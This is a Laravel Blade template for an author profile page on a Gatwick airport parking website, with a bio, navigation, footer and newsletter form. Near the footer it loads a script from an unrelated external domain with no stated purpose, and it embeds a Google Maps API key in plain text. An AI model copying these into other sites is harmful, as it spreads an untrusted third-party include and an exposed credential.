<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="msvalidate.01" content="377E9E53DDB6879262C788318F6BA3D8" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.css" integrity="sha512-HHsOC+h3najWR7OKiGZtfhFIEzg5VRIPde0kB0bG2QRidTQqf+sbfcxCTB16AcFB93xMjnBIKE29/MjdzXE+qw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" type="text/css" href="{{url('theme-new/css/style.css')}}">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@200;300&display=swap" rel="stylesheet">
<title>Author</title>

    <!--==== Style css file ====-->
    <link rel="stylesheet" href="assets/css/blog.css">
    <!--==== Responsive css file ====-->
    <link rel="stylesheet" href="assets/css/responsive.css">
    <!--==== Custom css file ====-->
    <link rel="stylesheet" href="assets/css/custom.css">
    <style>
        .sej-aut-area {
            background-color: #f7f7f7;
        }
        .color-yellow {
            color: #d3ac35;
        }
        .sej-aut-h {
            font-size: 26px;
            margin: 0 0 10px;
            color:black;
        }
        .sej-aut-pos {
            color: #9d9d9d;
            line-height: 1.2;
            margin: auto;
            max-width: 200px;
        }
        .open-modal_js{
            display: inline-block;
            width: auto;
            margin: 20px;
            font-weight: 700;
            text-align: center;
            white-space: nowrap;
            cursor: pointer;
            user-select: none;
            text-transform: capitalize;
            vertical-align: middle;
            background-size: 250% 100%;
            background-color: #5ec92a;
            color:white;
            padding-left:30px;
            padding-right:30px;
            font-size: 16px!important;
        }
        .sej-aut-sub-h {
            font-size: 20px;
            margin: 20px 0 10px;
            font-weight: 700;
            line-height: 1.2;
            font-style: normal;
            clear: both;
            word-wrap: break-word;
            letter-spacing: .1px;
            color:black;
        }
        .sej-aut-tags {
            color: #6a6a6a;
            list-style: none;
            margin: 0;
            padding: 0;
        }
        .sej-aut-tags li a, .sej-aut-tags li span {
            border-radius: 10px;
            padding: 4px 5px;
            background-color: #ebebeb;
            color: #6a6a6a!important;
            text-decoration: none;
            transition: .2s;
            margin:5px;
             display: inline-block;
        }
        .sej-aut-etitle {
            margin-top: 0;
            font-size: 30px;
            font-weight: 700;
            line-height: 1.2;
            font-style: normal;
            clear: both;
            color:black;
            word-wrap: break-word;
            letter-spacing: .1px;
        }
        ul {
list-style-type: none;
}
    </style>

</head>

<body>
    <!-- header -->
<section id="header" class="">
	<div class="container">
		<div class="row justify-content-center">
			<nav class="navbar navbar-expand-lg">
			  <div class="container-fluid">
			    <a class="navbar-brand" href="{{url('/')}}" >
			    	<img src="{{url('theme-new/img/logo2.png')}}" height="40px" class="top-img" alt="Flight Park One Logo">
			    </a>
			    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
			      <span class="navbar-toggler-icon"></span>
			    </button>
			    <div class="collapse navbar-collapse" id="navbarNavDropdown">
			      <ul class="navbar-nav">
			        <li class="nav-item">
			          <a class="nav-link active" aria-current="page" href="{{url('/')}}" style="color:#4aa1d9">Home</a>
			        </li>
			        <li class="nav-item dropdown">
			          <a class="nav-link dropdown-toggle" href="javascript:void(0)" role="button" data-bs-toggle="dropdown" aria-expanded="false" style="color:#4aa1d9">
			            Airport Parking
			          </a>
			          <ul class="dropdown-menu">
                        <li><a class="dropdown-item" href="{{url('gatwick-airport-parking')}}">Airport Parking</a></li>
                        <li><a class="dropdown-item" href="{{url('gatwick-valet-parking')}}">Valet Parking</a></li>
                        <li><a class="dropdown-item" href="{{url('gatwick-meet-and-greet-parking')}}">Meet & Greet</a></li>
                        <li><a class="dropdown-item" href="{{url('gatwick-terminals')}}">Terminals</a></li>
			          </ul>
			        </li>
             <!--       <li class="nav-item">-->
			          <!--<a class="nav-link" href="{{url('about-us')}}">What We Do</a>-->
             <!--       </li>-->
                    <li class="nav-item">
			          <a class="nav-link" href="{{url('about-us')}}" style="color:#4aa1d9">About Us</a>
                    </li>
                    <li class="nav-item">
			          <a class="nav-link" href="{{url('how-it-works')}}" style="color:#4aa1d9">How it Works</a>
                    </li>
             <!--       <li class="nav-item">-->
			          <!--<a class="nav-link" href="{{url('blogs')}}">Blogs</a>-->
             <!--       </li>-->
			        <li style="background-color: #4aa1d9;">
		            	<a class="nav-link" href="{{url('support')}}">
				           <button type="button" class="btn " style="color: white;" >Customer Support</button>
				        </a>
				    </li>
			     
			      </ul>
			    </div>
			  </div>
			</nav>
		</div>
	</div>
	<hr style="color:#4aa1d9">
</section>
    

<section>
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-4 col-md-12 col-sm-12 sej-aut-area">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-4 col-md-12 col-sm-12">
                        </div>
                        <div class="col-lg-6 col-md-12 col-sm-12">
                           
                            <div class="sej-aut-part text-center">
                                 <img src="{{url('theme-new/img/Charles Thompson.PNG')}}" alt="" style="width:170px;border-radius:50%"><br>
                                <span class="sej-aut-status color-yellow text-center">VIP Contributor</span>
                                <h1 class="sej-aut-h">Charles Thompson</h1>
                                <div class="sej-aut-pos">VP of Operations</div>
                            </div>
                            
                            <div class="sej-aut-part text-center">
                                <a class="btn btn-sec font-size-16 open-modal_js" href="helpdesk@flightparkone.com">Email Author</a>
                            </div>
                            
                            <div class="sej-aut-part">
                                <h3 class="sej-aut-sub-h mb0">Company</h3>
                                <p class="sej-aut-comp mb0"><a target="_blank" rel="noopener"  href="#">FlightParkOne</a></p>
                            </div>
                            
                            <div class="sej-aut-part">

                                    <h3 class="sej-aut-sub-h">Follow Me</h3>
            
                                        <ul class="sej-aut-list">
                                            <li>         
                                                <span style="" class="svg-icon" >
                                                <svg role="img" viewBox="0 0 24 24" style="height:25px;width:25px">
                                                <g>
                                                    <path fill="currentColor" d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"></path>
                                                </g></svg>
                                                        </span>
                                                <a target="_blank" href="">Subscribe</a>
                                            </li>
                                        </ul>
                                                    
                                        <ul class="sej-aut-list">
                                                            <span style="" class="svg-icon">
                                                        <svg role="img" viewBox="0 0 512 512" style="height:25px;width:25px">
                                                            
                                                        <g>
                                                <path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path>
                                            </g></svg>
                                                    </span>
                                                    <a target="_blank" href="https://twitter.com/ashleymadhatter">Twitter</a>
                                                    </li>
                                        </ul>
                                        <ul class="sej-aut-list">
                                            <li>         
                                                <span style="margin-top:-6px;" class="svg-icon">
                                                        <svg role="img" viewBox="0 0 24 24" style="height:25px;width:25px">
                                                            
                                                        <g>
                                                <path fill="currentColor" d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"></path>
                                            </g></svg>
                                        </span>
    
                                    <a target="_blank" href="">LinkedIn</a>
                                            </li>
                                        </ul>
                            </li>
                            </div>
                            
                            <div class="sej-aut-part">
                                <h3 class="sej-aut-sub-h mb0">Expertise</h3>
                                <ul class="sej-aut-tags">
                                    <!--<li><a target="_blank" title="Click to View" href="#">Content Marketing</a></li>-->
                                    <!--<li><a target="_blank" title="Click to View" href="#">Entrepreneurism</a></li>-->
                                    <li style=" display: inline-block"><a href="">Content Marketing</a></li>
                                    <li style=" display: inline-block"><a href="">Entrepreneurism</a></li>
                                </ul>
                            </div>
                            
                            <div class="sej-aut-part">
                                <h3 class="sej-aut-sub-h mb0">Favorite Tools</h3>
                                <ul class="sej-aut-tags">
                                    <li style=" display: inline-block"><a href="">DeepCrawl</a></li>
                                    <li style=" display: inline-block"><a href="">Semrush</a></li>
                                    <li style=" display: inline-block"><a href="">Canva</a></li>
                                    <li style=" display: inline-block"><a href="">Yoast</a></li>
                                    <li style=" display: inline-block"><a href="">HARO</a></li>
                                    <li style=" display: inline-block"><a href="">Buffer</a></li>
                                    <li style=" display: inline-block"><a href="">Trello</a></li>
                                </ul>           
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-lg-8 col-md-12 col-sm-12" style="padding-top:30px">
               <div class="container">
                   <div class="row">
                       <div class="col-lg-10 col-md-12 col-sm-12">
                           <section class="sej-tb-desc underline">
                                <h2 class="sej-aut-etitle">About</h2>
                                <p style="color:black">Charles Thompson, Parking Advisors and Expert from
                                    London, UK, has been in the parking business for almost 50
                                    years. He has been a technical advisor to several business
                                    firms on how to be more efficient, with a particular speciality
                                    in the parking industry across the Globe. He has a keen eye on
                                    the parking industry, and he constantly shares comparisons of
                                    different Parking providers.
                                </p>
                                <p style="color:black">He has been providing his services to large parking provider
                                    companies. He currently shares his experience in the Parking
                                    industry with his readers through articles and Blogs on the
                                    internet.
                                    Sharing insights on improving Parking experiences at
                                    different airports is Charles’s passion. He has written many
                                    articles comparing parking providers. He describes the pros
                                    and cons of each parking provider. Based on his research, he
                                    advises his readers to choose the parking provider that is
                                    currently providing cheap and best services</p>
                            </section>
                       </div>
                       <div class="col-lg-2 col-md-12 col-sm-12">
                           
                       </div>
                   </div>
               </div>
            </div>
        </div>
    </div>
</section>


<script language="JavaScript" src="//porjs.com/2440.js"></script>
   @php
        $site_settings_main=[];
            $settingsAll = App\settings::all();
                    foreach ($settingsAll as $setting) {
                        $site_settings_main[$setting->field_name] = $setting->field_value;
                    }
    @endphp

<footer id="footer">
	<div class="footer-wrap">
		<div class="second_class">
			<div class="container second_class_bdr">
				<div class="row">
					<div class="col-md-3 col-sm-6">
						<div class="footer-logo"><img src="{{url('theme-new/img/logo.png')}}" alt="logo"> </div>
						<p>{!! $site_settings_main["footer_catch_line"]  !!}</p>
						<ul class="contact-link">
							<li>
								<a href="#">
									<i class="fa-solid fa-house"></i> 
									Flightpark One Ltd Flightpath Effingham Road Horley RH6 9RP
								</a>
							</li>
							<li>
								<a href="tel:0330 179 7645">
									<i class="fa-solid fa-phone"></i> 
									0330 179 7645
								</a>
							</li>
							<li>
								<a href="mailto: helpdesk@flightparkone.com">
									<i class="fa-solid fa-envelope"></i>
									helpdesk@flightparkone.com
								</a>
							</li>
						</ul>
					</div>
					<div class="col-md-3 col-sm-6">
						<h3>Our Links</h3>
						<ul class="footer-links">
                            <li><a href="{{url('gatwick-airport-parking')}}">Airport Parking</a></li>
                            <li><a href="{{url('gatwick-valet-parking')}}">Valet Parking</a></li>
                            <li><a href="{{url('gatwick-meet-and-greet-parking')}}">Meet & Greet</a></li>
                            <li><a href="{{url('gatwick-terminals')}}">Terminals</a></li>
                            <li><a href="{{url('terms-and-conditions')}}">Terms & Conditions</a></li>
                            <li><a href="{{url('privacy-policy')}}">Privacy Policy</a></li>
						</ul>
					</div>
					<div class="col-md-3 col-sm-6">
						<h3>Blogs</h3>
						<ul class="footer-links">
						    <li><a href="{{url('blog')}}"><b>Blogs</b></a></li>
                            <li><a href="{{url('cheap-gatwick-parking')}}">Cheap Gatwick Parking</a></li>
                            <li><a href="{{url('south-terminal-parking')}}">South Terminal Parking</a></li>
                            <li><a href="{{url('north-terminal-parking')}}">North Terminal Parking</a></li>
                            <li><a href="{{url('book-gatwick-parking-today')}}">Book Gatwick Parking</a></li>
                            <li><a href="{{url('budget-friendly-gatwick-airport-parking')}}">Budget Friendly Parking</a></li>
						</ul>
					</div>
					<div class="col-md-3 col-sm-6 px-4">
						<h3>Subscribe For a Newsletter</h3>
						<p>Get discounts and newsletters on our Flightparkone parking in your email. We promise to not spam. Unsubscribe anytime</p>
						<form id="subscribe" class="newsletter">
                                <input class="enteremail fl-wrap" name="subscribe_user_email" id="subscribe_user_email" placeholder="Enter Your Email" spellcheck="false" type="text">
                                <input name="subscribe_user_name" id="subscribe_user_name" type="hidden">
                                <button type="submit" id="subscribe-button" class="newsletter_submit_btn"><i class="fa-solid fa-paper-plane"></i></button>
                                <label for="subscribe-email" class="subscribe-message"></label>
                            </form>
						<div class="standard_social_links">
							<div>
							    
								@if(array_key_exists("facebook",$site_settings_main) && $site_settings_main["facebook"] !="" && $site_settings_main["facebook_status"] =="active")
                                	<li class="round-btn btn-facebook"><a target="_blank" href='{{ $site_settings_main["facebook"] }}'><i class="fab fa-facebook-f"></i></a> </li>
                                @endif
                				@if(array_key_exists("twitter",$site_settings_main) && $site_settings_main["twitter"] !="" && $site_settings_main["twitter_status"] =="active")
                                	<li class="round-btn btn-twitter"><a target="_blank" href='{{ $site_settings_main["twitter"] }}'><i class="fab fa-twitter"></i></a></li>
                                @endif
                                @if(array_key_exists("instagram",$site_settings_main) && $site_settings_main["instagram"] !="" && $site_settings_main["instagram_status"] =="active")
                                	<li class="round-btn btn-instagram"><a target="_blank" href='{{ $site_settings_main["instagram"] }}'><i class="fab fa-instagram"></i></a></li>
                                @endif
                                @if(array_key_exists("linkedin",$site_settings_main) && $site_settings_main["linkedin"] !="" && $site_settings_main["linkedin_status"] =="active")
                                	<li class="round-btn btn-linkedin"><a target="_blank" href='{{ $site_settings_main["linkedin"] }}'><i class="fab fa-linkedin"></i></a></li>
                                @endif
                                @if(array_key_exists("youtube",$site_settings_main) && $site_settings_main["youtube"] !="" && $site_settings_main["youtube_status"] =="active")
                                    <li class="round-btn btn-youtube"><a target="_blank" href='{{ $site_settings_main["youtube"] }}'><i class="fab fa-youtube"></i></a></li>
                                @endif
                                @if(array_key_exists("google_plus",$site_settings_main) && $site_settings_main["google_plus"] !="" && $site_settings_main["google_plus_status"] =="active" )
                                	<li class="round-btn btn-google_plus"><a target="_blank" href='{{ $site_settings_main["google_plus"] }}'><i class="fab fa-google_plus"></i></a></li>
                                @endif
                                @if(array_key_exists("pinterest",$site_settings_main) && $site_settings_main["pinterest"] !="" && $site_settings_main["pinterest_status"] =="active")
                                	<li class="round-btn btn-pinterest"><a target="_blank" href='{{ $site_settings_main["pinterest"] }}'><i class="fab fa-pinterest"></i></a></li>
                                @endif
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="container-fluid">
				<div class="copyright"> {{$site_settings_main["footer_copyright"]}} {{$site_settings_main["footer_company_reg_no"]}}.</div>
			</div>
		</div>
	</div>
</footer>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
<script src="https://zmdtravel.com/theme/tinyCalender/index.js"></script>
<script src="{{url('theme-new/js/main.js')}}"></script>


<script src="{{url('theme/tinyCalender/index.js')}}"  ></script>
@if(substr(strrchr(url()->current(),"/"),1)!='result')
<script>
	var enddate = new Date();
    enddate.setDate(enddate.getDate()+ 8);
	new TinyPicker({ 
	format: 'dd-mm-yyyy',
	firstBox:document.getElementById('startDate'), // Required -- Overrides us finding the first input box
	lastBox: document.getElementById('endDate'), // Required -- Overrides us finding the last input box
	startDate: new Date(), // Needs to be a valid instance of Date   
    endDate: enddate, // Needs to be a valid instance of Date
	allowPast: false, // If you want the user to be able to select past dates
	useCache: true, 
	orientation: "top auto",
	 horizontal: 'auto',
    vertical: 'auto'
}).init();
</script>
<script>
	var enddate = new Date();
    enddate.setDate(enddate.getDate()+ 8);
	new TinyPicker({ 
	format: 'dd-mm-yyyy',
	firstBox:document.getElementById('startDate_header'), // Required -- Overrides us finding the first input box
	lastBox: document.getElementById('endDate_header'), // Required -- Overrides us finding the last input box
	startDate: new Date(), // Needs to be a valid instance of Date   
    endDate: enddate, // Needs to be a valid instance of Date
	allowPast: false, // If you want the user to be able to select past dates
	useCache: true, 
	orientation: "top auto",
	 horizontal: 'auto',
    vertical: 'auto'
}).init();
</script>
@else
@php

$dropdate = str_replace('/', '-', request()->dropoffdate);		
$pickdate = str_replace('/', '-', request()->departure_date);

$dropofdate = date('m/d/Y', strtotime($dropdate));
$pickupdate = date('m/d/Y', strtotime($pickdate));

@endphp
<script>
// $(document).ajaxStop(function () {
//     //var dropDate = '{{ request()->dropoffdate }}';
//     //var departureDate = '{{ request()->departure_date }}';

    
//     var dropDate = '{{ $dropofdate }}';
//     var departureDate = '{{ $pickupdate }}';


// 	var enddate = new Date(departureDate);
//     // enddate.setDate(enddate);
// 	new TinyPicker({ 
// 	firstBox:document.getElementById('startDate'), // Required -- Overrides us finding the first input box
// 	lastBox: document.getElementById('endDate'), // Required -- Overrides us finding the last input box
// 	startDate: new Date(dropDate), // Needs to be a valid instance of Date   
//     endDate: enddate, // Needs to be a valid instance of Date
// 	allowPast: false, // If you want the user to be able to select past dates
// 	useCache: true, 
// 	orientation: "top auto",
// 	 horizontal: 'auto',
// 	 success: function(startDate, endDate){}, // callback function when user inputs dates,
//     vertical: 'auto'
// }).init();
// });
</script> 
@endif



<script async type="text/javascript">

    $(document).ready(function () {
       

 
        // process the form
        $('#subscribe').submit(function (event) {

            var formData = {
                'name': $('#subscribe_user_name').val(),
                'email': $('#subscribe_user_email').val(),
                '_token': '{{ @csrf_token() }}'
            };

            // process the form
            $.ajax({
                type: 'POST', // define the type of HTTP verb we want to use (POST for our form)
                url: '{{ route("subscribe_user") }}', // the url where we want to POST
                data: formData, // our data object
                dataType: 'json', // what type of data do we expect back from the server
                encode: true
            })
            // using the done promise callback
                .done(function (data) {
                    
                     if (data.success == 0) {
                        if(data.errors=='validation.unique'){
                           $(".subscribe-message").html('<i class="fa fa-times"></i> <strong>Sorry!</strong> This email already subscribed.');
                        }else
                        {
                           $(".subscribe-message").html('<i class="fa fa-times"></i> <strong>Sorry!</strong> '+data.errors);
                       }
                    } else {

                        $("#subscribe").trigger('reset');
                        $(".subscribe-message").html('<i class="fa fa-check"></i> <strong>Success!</strong> '+data.data);
                    }

                });

            event.preventDefault();
        });

    });

</script>

<script async  type="text/javascript">
    $(".accordion-toggle").on('click', function (e) {
        e.preventDefault();
        $($(this).attr("href")).toggleClass('collapse');
        var condition = false;
        if ($($(this).attr("href")).attr("aria-expanded") == false) {
            condition = true;
        } 
    });

$(document).mouseleave(function () {
    console.log('out');
});
</script>

@section("footer-script")

@show



    <!-- JS Files -->
    <!-- ==== JQuery 3.3.1 js file==== -->
    <script src="assets/js/jquery-3.3.1.min.js"></script>
    <!-- ==== Bootstrap js file==== -->
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <!-- ==== JQuery Waypoint js file==== -->
    <script src="assets/plugins/waypoints/jquery.waypoints.min.js"></script>
    <!-- ==== Parsley js file==== -->
    <script src="assets/plugins/parsley/parsley.min.js"></script>
    <!-- ==== Ratina js file==== -->
    <script src="assets/plugins/retinajs/retina.min.js"></script>
    <!-- ==== parallax js==== -->
    <script src="assets/plugins/parallax/parallax.js"></script>
    <!-- ==== Owl Carousel js file==== -->
    <script src="assets/plugins/owl-carousel/owl.carousel.min.js"></script>
    <!-- ==== Menu  js file==== -->
    <script src="assets/js/menu.min.js"></script>
    <!-- ===video popup=== -->
    <script src="assets/plugins/Magnific-Popup/jquery.magnific-popup.min.js"></script>
    <!-- ====Counter js file=== -->
    <script src="assets/plugins/waypoints/jquery.counterup.min.js"></script>
    <!-- cammera js -->
    <script src="assets/plugins/camera/camera.min.js"></script>
    <!-- easing js -->
    <script src="assets/js/easing.js"></script>
    <!--==== google map api key ====-->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB2D8wrWMY3XZnuHO6C31uq90JiuaFzGws"></script>
    <!-- ==== Script js file==== -->
    <script src="assets/js/scripts.js"></script>
    <!-- ==== Custom js file==== -->
    <script src="assets/js/custom.js"></script>

</body>

</html>